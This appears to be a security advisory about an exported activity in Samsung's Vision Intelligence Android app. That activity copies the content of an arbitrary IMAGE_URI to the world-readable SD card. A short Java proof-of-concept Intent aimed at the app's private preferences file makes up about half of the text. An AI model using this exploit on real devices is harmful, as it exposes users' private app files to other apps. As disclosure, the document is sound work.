# Description

Oversecured report:
![](Oversecured_report.png)

The exported activity `com.samsung.android.visionintelligence.viImageActivity` took an external string parameter `IMAGE_URI`, which it treated as a URI and saved content from there to the SD card at the path `/sdcard/Android/data/com.samsung.android.visionintelligence/files/IntelligentCam/{yyyyymmdd}/{yyyyymmdd}-{hhmmss}.jpg`. Since the SD card is a world-readable directory, an attacker could make arbitrary files be copied there and then read them.

**Proof of Concept**

```java
Intent i = new Intent();
i.setClassName("com.samsung.android.visionintelligence", "com.samsung.android.visionintelligence.viImageActivity");
i.putExtra("IMAGE_URI", "file:///data/user/0/com.samsung.android.visionintelligence/shared_prefs/visionSetting.xml");
startActivity(i);
```
